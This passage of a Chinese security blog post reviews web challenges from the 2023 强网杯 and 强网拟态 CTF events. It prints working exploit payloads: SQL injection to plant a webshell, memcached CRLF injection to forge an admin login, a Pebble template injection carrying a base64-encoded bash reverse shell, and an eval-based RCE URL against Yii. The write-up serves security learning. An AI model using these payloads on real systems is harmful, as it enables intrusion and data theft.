class="string">&#x27;image&#x27;</span>: <span class="string">&#x27;123&#x27;</span>,</span><br><span class="line">    <span class="string">f&quot;data`=&#x27;<span class="subst">&#123;exp&#125;</span>&#x27;/**/WHERE/**/`id`/**/=/**/1;#&quot;</span>: <span class="string">&#x27;123&#x27;</span>,<span class="string">&#x27;data&#x27;</span>: <span class="string">&#x27;1&#x27;</span></span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">re = requests.post(url=url,cookies=cookies,data=data)</span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(re.text)</span><br></pre></td></tr></table></figure>
+
+<p>运行脚本，将payload写到数据库里了，再次访问第一个商品页面详情</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/10.png" class>
+
+<p>生成的文件名都是固定的，在public目录下</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/11.png" class>
+
+<p>可以成功拿到shell了。</p>
+<h3 id="2-thinkshopping"><a href="#2-thinkshopping" class="headerlink" title="2.thinkshopping"></a>2.thinkshopping</h3><p>这个是thinkshop的复仇版本，同样的，将docker导出的镜像环境生成镜像。查询数据库后，admin表数据为空</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/12.png" class>
+
+<p>使用 1 123456账号密码也登陆不了后台了。我在文章开头也说了，题目是有 memcached 插件的，而在登录这块代码逻辑</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/13.png" class>
+
+<p>它是从缓存中获取数据，调试简单看看</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/14.png" class>
+
+<p>key的值为 “think:shop.admin|123”</p>
+<p>Memcached是一个开源、高性能的分布式内存对象缓存系统，并且数据是以键值对格式存储。该key对应的value就是密码。Memcached存在CRLF注入，具体细节参考以下文章：</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">https://www.freebuf.com/vuls/328384.html</span><br></pre></td></tr></table></figure>
+
+<p>在控制器中添加一个路由，看看缓存数据存储格式是什么样的。</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/15.png" class>
+
+<p>它是将sql查询结果写进缓存里，但是题目数据库admin表并没有数据，所以需要我们手动添加账号密码</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/16.png" class>
+
+<p>添加了账号为admin，密码为admin的md5值，接着访问test路由，然后连接题目的 11211端口，该端口是缓存服务器的开放端口，看看查询数据是否被写进缓存里了。</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/17.png" class>
+
+<p>类似于php的序列化串，通过上文链接可知存在CRLF注入，所以在登录的时候，可以向缓存中写入任意数据，首先构造账号为admin，密码为123456的缓存数据</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">set think:shop.admin|admin 4 500 101 a:3:&#123;s:2:&quot;id&quot;;i:1;s:8:&quot;username&quot;;s:5:&quot;admin&quot;;s:8:&quot;password&quot;;s:32:&quot;e10adc3949ba59abbe56e057f20f883e&quot;;&#125; </span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/18.png" class>
+
+<p>登录成功，注意随着admin传参，要有\r和\n，也就是CRLF。登录进去之后，之前的sql注入点并没有修复。可以利用sql注入漏洞来写shell或者读文件。</p>
+<p>本地题目数据库查看 secure_file_priv 选项是否设置</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/19.png" class>
+
+<p>value为空，没有设置可被导入的路径，那么就可以任意文件读取了。</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/20.png" class>
+
+<p>读取的flag文件内容更新到goods表中的name字段，然后显示到游览器上。审计源码上思维还得多发散一些，不能总纠结一个地方，思路容易堵死。</p>
+<p>参考链接：<a target="_blank" rel="noopener" href="https://mp.weixin.qq.com/s?__biz=Mzg5NDY4NTc4NQ==&mid=2247485699&idx=1&sn=27db883c33613ec20c19b1790423ad1b&chksm=c01a8e35f76d072321da7907ce209e294a5f4559d858e980eaa03fee068be0dcae9918ca21c9&mpshare=1&scene=23&srcid=12183YVSAJj2TAyzS1DL2081&sharer_shareinfo=aa98022894937686e35aeb1d04a0b4b8&sharer_shareinfo_first=aa98022894937686e35aeb1d04a0b4b8#rd">[CTF复现计划]2023强网杯初赛 thinkshop(ping)</a></p>
+<h3 id="3-hellospring"><a href="#3-hellospring" class="headerlink" title="3.hellospring"></a>3.hellospring</h3><p>这道题并不算难，相关做法也比较清晰，只不过题目中加了waf，但是源码中给删了。黑盒绕waf，属实是难为我了。java的模板注入也没有学，只是怼着网上文章的payload打。</p>
+<p>题目给了jar包，但是在本地搭建的时候又失败了，好像是因为模板文件配置的有问题。总的来说，在做代码审计题的时候，在环境搭建上花了不少功夫。</p>
+<p>于是简单写了个dockerfile，能让模板文件跑起来，但是调试不了了。考的是pebble模板注入</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/21.png" class>
+
+<p>uploadFile 路由用于上传pebble模板文件，根路由可以get传x参数指定pebble模板文件进行渲染。题目有黑名单，但是源码没有</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/22.png" class>
+
+<p>上传的文件重命名了，根据上传的当前时间按照一定格式进行命名</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/23.png" class>
+
+<p>可以本地docker起个环境，上传一个模板文件查看当前大致时间，然后利用burp发包访问，关键就在于payload的绕过，比赛的时候找了Y4师傅文章里的最新exp，但是没有反弹成功，然后看了其他师傅写的writewp，将”cationC”和”ontext”拼接，应该就是过滤了这个</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&#123;% set y= beans.get(&quot;org.springframework.boot.autoconfigure.internalCachingMetadataReaderFactory&quot;).resourceLoader.classLoader.loadClass(&quot;java.beans.Beans&quot;) %&#125;</span><br><span class="line">&#123;% set yy =  beans.get(&quot;jacksonObjectMapper&quot;).readValue(&quot;&#123;&#125;&quot;, y) %&#125;</span><br><span class="line">&#123;% set yyy = yy.instantiate(null,&quot;org.springframework.context.support.ClassPathXmlAppli&quot;+&quot;cationC&quot;+&quot;ontext&quot;) %&#125;</span><br><span class="line">&#123;&#123; yyy.setConfigLocation(&quot;http://127.0.0.1:8889/1.xml&quot;) &#125;&#125;</span><br><span class="line">&#123;&#123; yyy.refresh() &#125;&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过该payload访问并解析指定的xml文件，并执行命令，反弹shell</p>
+<figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=<span class="string">&quot;1.0&quot;</span> encoding=<span class="string">&quot;UTF-8&quot;</span> ?&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">beans</span> <span class="attr">xmlns</span>=<span class="string">&quot;http://www.springframework.org/schema/beans&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xmlns:xsi</span>=<span class="string">&quot;http://www.w3.org/2001/XMLSchema-instance&quot;</span></span></span><br><span class="line"><span class="tag">       <span class="attr">xsi:schemaLocation</span>=<span class="string">&quot;</span></span></span><br><span class="line"><span class="string"><span class="tag">     http://www.springframework.org/schema/beans http://www.springframework.org/schema/beans/spring-beans.xsd&quot;</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">bean</span> <span class="attr">id</span>=<span class="string">&quot;pb&quot;</span> <span class="attr">class</span>=<span class="string">&quot;java.lang.ProcessBuilder&quot;</span> <span class="attr">init-method</span>=<span class="string">&quot;start&quot;</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">constructor-arg</span> &gt;</span></span><br><span class="line">            <span class="tag">&lt;<span class="name">list</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>bash<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>-c<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;<span class="name">value</span>&gt;</span>echo YmFzaCAtaSA+Ji9kZXYvdGNwLzEyNy4wLjAuMS83Nzg4IDA+JjE=|base64 -d|bash -i<span class="tag">&lt;/<span class="name">value</span>&gt;</span></span><br><span class="line">                <span class="tag">&lt;/<span class="name">list</span>&gt;</span></span><br><span class="line">            <span class="tag">&lt;/<span class="name">constructor-arg</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;/<span class="name">bean</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">beans</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<h3 id="4-Funweb（强网拟态）"><a href="#4-Funweb（强网拟态）" class="headerlink" title="4.Funweb（强网拟态）"></a>4.Funweb（强网拟态）</h3><p>当时组里参加比赛的同学发了一道强网拟态线下的白盒审计题，在此也记录一下</p>
+<p>是Yii框架 1.1.14版本，现有的exp都是打不通的。yii爆出很多反序列化漏洞，但是没有反序列化入口。这道题是需要自己挖洞的。而且代码里也只有一个控制器 SiteController，当时看代码的时候只在乎明显的定义路由代码</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/24.png" class>
+
+<p>明显的路由定义像什么 index，Contact，Login都是没有漏洞的，登录甚至没有数据库交互，就类似于前端页面。分析代码的时候完全忽略了actions，于是看了半天没找到一点突破口。在actions函数里注册了三个类，虽然不太懂为什么要这么做，但是 captcha 有点熟悉，在thinkphp里也见过，生成验证码的。</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/25.png" class>
+
+<p>与普通路由访问方式差不多是一样的。我们突破口在 CacheAction 类</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/26.png" class>
+
+<p>访问cache路由的时候会调用该类的run方法，param数组的参数也是可控的。至于为什么，后续调试都会说明。</p>
+<p>获取当前控制器实例后，调用 beginCache 方法开启缓存，跟进</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/27.png" class>
+
+<p>调用当前控制器的 <code>beginWidget</code> 方法，启动一个名为 <code>&#39;COutputCache&#39;</code> 的小部件</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/28.png" class>
+
+<p>创建小部件，也就是 Widget</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/29.png" class>
+
+<p>创建完成后，跟进init初始化方法，静态去跟进是成功不了的，所以只能调试去看</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/30.png" class>
+
+<p>来到了 COutputCache 类的 init 方法，调用当前小部件（widget）的 <code>getIsContentCached</code> 方法，判断缓存内容是否已经存在。然后再跟进 checkContentCache 方法</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/31.png" class>
+
+<p>目的是要调用 getCacheKey 函数，但前提就是满足 if 条件语句，requestTypes 属性默认为空</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/32.png" class>
+
+<p>获取 cacheID 的值，所以要对该属性赋值，不让它为空即可，当然也不是随便赋值的</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/35.png" class>
+
+<p>接下来调用 getCacheKey 方法</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/33.png" class>
+
+<p>而在这里，对 varyByExpression 属性赋值，调用 evaluateExpression 方法</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/34.png" class>
+
+<p>参数拼接，eval函数执行命令，能够成功RCE。那么payload为</p>
+<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">index-test.php?r=site/cache&amp;param[cacheID]=log&amp;param[varyByExpression]=system(%22whoami%22)</span><br></pre></td></tr></table></figure>
+
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/36.png" class>
+
+<h4 id="路由调试浅析"><a href="#路由调试浅析" class="headerlink" title="路由调试浅析"></a>路由调试浅析</h4><p>接下来分析一下注册的cache路由是怎么调度的，以及public属性是怎么传递的</p>
+<p>首先会执行主程序的 run 方法，然后调用 processRequest 方法处理用户请求</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/37.png" class>
+
+<p>解析路由，将得到的路由信息执行控制器动作的方法，随后执行控制器的run方法</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/38.png" class>
+
+<p>首先将cache与action拼接，判断控制器中是否存在对应的方法名。如果不存在，调用 <code>createActionFromMap</code> 方法，根据动作映射（通过 <code>$this-&gt;actions()</code> 获取）以及给定的 <code>$actionID</code> 创建一个动作对象。也就拿到了CacheAction类</p>
+<p>在执行 runWithParams 方法的时候，会调用</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/39.png" class>
+
+<p>将url中的参数值当作runWithParams 方法的参数传递，这也就是为什么类属性可控的原因。</p>
+<img src="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/40.png" class>
+
+<p>最后就是利用反射获取run方法并执行，也就走到了 CacheAction 的run方法，后续开头分析过了，就不再重复说了。</p>
+<h3 id="0x03-结语"><a href="#0x03-结语" class="headerlink" title="0x03 结语"></a>0x03 结语</h3><p>在分析代码的时候，个人感觉，最大的阻碍就是未知，也就是害怕看了半天代码结果没有漏洞，往往就止步不前。在以后审计代码的时候，要尝试静下心，还有坚持。</p>
+<p>从这几道代码审计题中能够学到很多。</p>
+<p><a target="_blank" rel="noopener" href="https://hurrison.com/posts/mimic2023/">https://hurrison.com/posts/mimic2023/</a></p>
+<p><a target="_blank" rel="noopener" href="https://blog.wm-team.cn/index.php/archives/69/">https://blog.wm-team.cn/index.php/archives/69/</a></p>
+</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta">文章作者: </span><span class="post-copyright-info"><a href="https://xilitter.github.io">XiLitter</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta">文章链接: </span><span class="post-copyright-info"><a href="https://xilitter.github.io/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/">https://xilitter.github.io/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta">版权声明: </span><span class="post-copyright-info">本博客所有文章除特别声明外，均采用 <a href="https://creativecommons.org/licenses/by-nc-sa/4.0/" target="_blank">CC BY-NC-SA 4.0</a> 许可协议。转载请注明来自 <a href="https://xilitter.github.io" target="_blank">XiLitter</a>！</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/ctf/">ctf</a></div><div class="post_share"><div class="social-share" data-image="/img/art/a10.jpg" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><div class="next-post pull-full"><a href="/2023/12/11/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94DedeCMS-5-5-7-sp2/" title="从0学代码审计——DedeCMS-5.5.7-sp2"><img class="cover" src="/img/art/a9.jpg" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="pagination-info"><div class="label">下一篇</div><div class="next_info">从0学代码审计——DedeCMS-5.5.7-sp2</div></div></a></div></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>相关推荐</span></div><div class="relatedPosts-list"><div><a href="/2023/11/02/0ctf-2021-buggyLoader%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="0ctf-2021 buggyLoader题目复现"><img class="cover" src="/img/art/a2.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-11-02</div><div class="title">0ctf-2021 buggyLoader题目复现</div></div></a></div><div><a href="/2023/01/31/2022%E5%AE%89%E6%B4%B5%E6%9D%AFweb/" title="2022安洵杯web"><img class="cover" src="/img/art/a8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-01-31</div><div class="title">2022安洵杯web</div></div></a></div><div><a href="/2023/07/24/2023%E6%9E%81%E5%AE%A2%E5%B7%85%E5%B3%B0babyurl-%E5%88%9D%E8%AF%86%E4%BA%8C%E6%AC%A1%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" title="2023极客巅峰babyurl-初识二次反序列化"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-24</div><div class="title">2023极客巅峰babyurl-初识二次反序列化</div></div></a></div><div><a href="/2023/07/30/2022%E8%93%9D%E5%B8%BD%E6%9D%AFEz-gadget%E9%A2%98%E7%9B%AE%E5%88%86%E6%9E%90/" title="2022蓝帽杯Ez_gadget题目分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-30</div><div class="title">2022蓝帽杯Ez_gadget题目分析</div></div></a></div><div><a href="/2023/02/04/2023%E8%A5%BF%E6%B9%96%E8%AE%BA%E5%89%91%E9%83%A8%E5%88%86web%E5%A4%8D%E7%8E%B0/" title="2022西湖论剑部分web复现"><img class="cover" src="/img/art/a8.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-02-04</div><div class="title">2022西湖论剑部分web复现</div></div></a></div><div><a href="/2023/07/28/2023%E9%98%BF%E9%87%8C%E4%BA%91CTF-ezbean%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0%E4%B8%8E%E5%88%86%E6%9E%90/" title="2023阿里云CTF-ezbean题目复现与分析"><img class="cover" src="/img/art/a3.jpg" alt="cover"><div class="content is-center"><div class="date"><i class="far fa-calendar-alt fa-fw"></i> 2023-07-28</div><div class="title">2023阿里云CTF-ezbean题目复现与分析</div></div></a></div></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info"><div class="is-center"><div class="avatar-img"><img src="/img/avatar.jpg" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info__name">XiLitter</div><div class="author-info__description">且视他人之疑目如盏盏鬼火，大胆去走你的夜路。</div></div><div class="card-info-data site-data is-center"><a href="/archives/"><div class="headline">文章</div><div class="length-num">64</div></a><a href="/tags/"><div class="headline">标签</div><div class="length-num">37</div></a><a href="/categories/"><div class="headline">分类</div><div class="length-num">10</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/XiLitter"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons is-center"><a class="social-icon" href="https://github.com/XiLitter" target="_blank" title="Github"><i class="fab fa-github"></i></a><a class="social-icon" href="/3336741183@qq.com" target="_blank" title="Email"><i class="fas fa-envelope"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>公告</span></div><div class="announcement_content">换博客主题了，感觉还是这个主题更好看，而且功能也多，但是好多功能暂且没设置，以后再弄。</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>目录</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#0x01-%E5%89%8D%E8%A8%80"><span class="toc-number">1.</span> <span class="toc-text">0x01 前言</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#0x02-%E8%B5%9B%E9%A2%98%E5%A4%8D%E7%9B%98"><span class="toc-number">2.</span> <span class="toc-text">0x02 赛题复盘</span></a><ol class="toc-child"><li class="toc-item toc-level-3"><a class="toc-link" href="#1-thinkshop"><span class="toc-number">2.1.</span> <span class="toc-text">1.thinkshop</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#2-thinkshopping"><span class="toc-number">2.2.</span> <span class="toc-text">2.thinkshopping</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#3-hellospring"><span class="toc-number">2.3.</span> <span class="toc-text">3.hellospring</span></a></li><li class="toc-item toc-level-3"><a class="toc-link" href="#4-Funweb%EF%BC%88%E5%BC%BA%E7%BD%91%E6%8B%9F%E6%80%81%EF%BC%89"><span class="toc-number">2.4.</span> <span class="toc-text">4.Funweb（强网拟态）</span></a><ol class="toc-child"><li class="toc-item toc-level-4"><a class="toc-link" href="#%E8%B7%AF%E7%94%B1%E8%B0%83%E8%AF%95%E6%B5%85%E6%9E%90"><span class="toc-number">2.4.1.</span> <span class="toc-text">路由调试浅析</span></a></li></ol></li><li class="toc-item toc-level-3"><a class="toc-link" href="#0x03-%E7%BB%93%E8%AF%AD"><span class="toc-number">2.5.</span> <span class="toc-text">0x03 结语</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>最新文章</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/" title="强网杯2023部分题目复盘"><img src="/img/art/a10.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="强网杯2023部分题目复盘"/></a><div class="content"><a class="title" href="/2023/12/21/%E5%BC%BA%E7%BD%91%E6%9D%AF2023%E9%83%A8%E5%88%86%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%9B%98/" title="强网杯2023部分题目复盘">强网杯2023部分题目复盘</a><time datetime="2023-12-21T11:40:07.000Z" title="发表于 2023-12-21 19:40:07">2023-12-21</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/11/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94DedeCMS-5-5-7-sp2/" title="从0学代码审计——DedeCMS-5.5.7-sp2"><img src="/img/art/a9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从0学代码审计——DedeCMS-5.5.7-sp2"/></a><div class="content"><a class="title" href="/2023/12/11/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94DedeCMS-5-5-7-sp2/" title="从0学代码审计——DedeCMS-5.5.7-sp2">从0学代码审计——DedeCMS-5.5.7-sp2</a><time datetime="2023-12-11T13:59:38.000Z" title="发表于 2023-12-11 21:59:38">2023-12-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/" title="从0学代码审计——极致CMS v1.9.5"><img src="/img/art/a9.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="从0学代码审计——极致CMS v1.9.5"/></a><div class="content"><a class="title" href="/2023/12/07/%E4%BB%8E0%E5%AD%A6%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1%E2%80%94%E2%80%94%E6%9E%81%E8%87%B4cms-v1-9-5/" title="从0学代码审计——极致CMS v1.9.5">从0学代码审计——极致CMS v1.9.5</a><time datetime="2023-12-07T09:48:34.000Z" title="发表于 2023-12-07 17:48:34">2023-12-07</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="DASCTF X 0psu3十一月挑战赛   WEB题目复现"><img src="http://pic.bizhi360.com/bpic/41/11541.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="DASCTF X 0psu3十一月挑战赛   WEB题目复现"/></a><div class="content"><a class="title" href="/2023/12/06/DASCTF-X-0psu3%E5%8D%81%E4%B8%80%E6%9C%88%E6%8C%91%E6%88%98%E8%B5%9B-WEB%E9%A2%98%E7%9B%AE%E5%A4%8D%E7%8E%B0/" title="DASCTF X 0psu3十一月挑战赛   WEB题目复现">DASCTF X 0psu3十一月挑战赛   WEB题目复现</a><time datetime="2023-12-06T03:42:39.000Z" title="发表于 2023-12-06 11:42:39">2023-12-06</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析"><img src="/img/art03.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="JDBC反序列化漏洞分析"/></a><div class="content"><a class="title" href="/2023/11/10/JDBC%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/" title="JDBC反序列化漏洞分析">JDBC反序列化漏洞分析</a><time datetime="2023-11-10T08:44:29.000Z" title="发表于 2023-11-10 16:44:29">2023-11-10</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url('/img/art/a10.jpg')"><div id="footer-wrap"><div class="copyright">&copy;2020 - 2024 By XiLitter</div><div class="framework-info"><span>框架 </span><a target="_blank" rel="noopener" href="https://hexo.io">Hexo</a><span class="footer-separator">|</span><span>主题 </span><a target="_blank" rel="noopener" href="https://github.com/jerryc127/hexo-theme-butterfly">Butterfly</a></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="阅读模式"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="浅色和深色模式转换"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="单栏和双栏切换"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside_config" type="button" title="设置"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="目录"><i class="fas fa-list-ul"></i></button><button 